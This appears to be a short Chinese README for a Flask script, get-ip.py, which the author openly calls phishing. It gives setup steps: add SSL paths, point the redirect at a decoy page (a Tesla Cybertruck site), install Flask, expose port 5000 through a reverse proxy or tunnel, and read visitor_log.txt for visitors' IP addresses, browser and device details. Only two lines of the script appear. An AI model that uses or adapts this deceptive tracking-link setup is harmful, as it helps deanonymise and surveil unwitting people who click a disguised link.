在代码最后一行配置SSL文件**绝对路径**，必须配置SSL，本来就是钓鱼的，https不配置可以放弃了

```python
# 代码最后一行 49 lines
    app.run(host=host, port=port, ssl_context=('crt file path', 'key file path'))
```

```python
# 更改你想要重定向的网站 39 lines
        return redirect('https://www.tesla.cn/cybertruck', code=302)
```

运行

```python
pip install flask
```

```python
python3 get-ip.py
```

此时已经在本地5000端口监听了，自行`反向代理`或`内网穿透`，只要可以通过域名访问，就能得到访问者的ip信息

查看历史数据

```python
cat visitor_log.txt
```

能得到的数据大概为IP地址、浏览器信息、设备信息
